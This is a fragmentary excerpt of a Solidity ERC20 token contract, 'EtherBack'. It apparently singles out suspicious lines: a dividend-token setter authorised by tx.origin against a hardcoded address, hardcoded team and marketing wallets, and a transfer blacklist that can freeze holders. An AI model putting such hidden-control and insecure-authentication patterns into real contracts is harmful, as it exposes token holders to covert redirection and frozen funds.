...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x71Fd6E28B67060fA7AC1064ab987B61A9A766f5d, "Only owner can change dividend contract address");
...
contract EtherBack is ERC20, Ownable {
    ...
    constructor() ERC20("EtherBack", "ETHBACK") {
    	...
    	marketingWallet = 0x550e6ae4e2119829AceA22904faee9Fc9EE231df;
    	teamWallet = 0x7482005f7d314175d0eF2210958224D1b8Dde318;
    ...
    function _transfer(
        ...
        require(!isBlacklisted[to] && !isBlacklisted[from], "To/from address is blacklisted!");
